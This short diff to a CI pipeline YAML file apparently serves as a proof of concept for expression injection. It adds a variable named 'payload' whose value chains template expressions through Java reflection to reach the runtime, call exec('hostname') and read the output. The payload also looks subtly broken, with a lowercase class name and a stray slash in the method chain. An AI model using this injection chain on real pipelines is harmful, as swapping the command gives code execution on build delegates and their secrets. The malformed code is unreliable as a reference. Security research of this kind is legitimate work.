@@ -32,6 +32,17 @@ pipeline:
                   spec:
                     shell: Sh
                     command: hostname
+        variables:
+          - name: payload
+            type: String
+            description: ""
+            required: false
+            value: <+<+<+<+<+<+<+'some'>.getClass()>.forName('java.lang.runtime')>.getRuntime()>.exec('hostname')>.getInputStream()>/readAllBytes()>
+        delegateSelectors:
+          - docker-delegate-2
+        sendGitStatus:
+          enabled: true
+          name: ""
   properties:
     ci:
       codebase:
